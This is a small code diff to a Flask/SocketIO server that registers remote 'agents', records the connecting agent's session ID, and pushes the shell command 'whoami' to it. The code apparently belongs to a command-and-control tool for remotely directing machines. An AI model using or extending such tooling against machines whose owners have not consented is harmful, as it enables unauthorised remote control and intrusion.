@@ -17,6 +17,7 @@ app = Flask(__name__)
 socketio = SocketIO(app)  # Create a SocketIO server
 
 agents = {}  # Dictionary to keep track of agents (agent_id : IP)
+agent_sid = None  # Global var to store agent session ID
 
 @app.route('/register', methods=['POST'])
 def register():
@@ -40,9 +41,12 @@ def handle_connect():
 
 #    agent_sessions[request.sid] = request.sid
 #    agent_sessions['latest'] = request.sid
+    global agent_sid
+    agent_sid = request.sid
+    print("[+] Agent connected:", agent_sid)
 
     # Test: send command directly to agent
-    socketio.emit('command', "whoami", room=request.sid)
+    socketio.emit('command', "whoami", room=agent_sid)    
 
 if __name__ == "__main__":
     # Start the SocketIO server with SSL support
